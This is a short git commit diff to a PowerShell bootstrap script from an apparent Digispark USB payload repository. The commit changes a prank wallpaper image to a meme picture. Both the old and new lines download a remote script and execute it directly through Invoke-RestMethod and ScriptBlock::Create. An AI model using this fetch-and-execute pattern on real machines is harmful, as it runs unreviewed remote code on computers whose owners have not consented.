30fef612d35b17f759bd0c1678c8b4bb364479bd
Mr. Cetto <contact@phoenixthrush.com>
2026-05-12 21:57:30 +0200

    upload chungus

--- bootstrap.ps1
+++ bootstrap.ps1
@@ -1,6 +1,6 @@
 param([int]$Method=0)
 
 switch($Method){
-    1{&([scriptblock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/methods/change_wallpaper.ps1'))) 'https://www.phoenixthrush.com/assets/images/background.webp'}
+    1{&([scriptblock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/methods/change_wallpaper.ps1'))) 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/assets/images/chungus.jpeg'}
     default{return}
 }
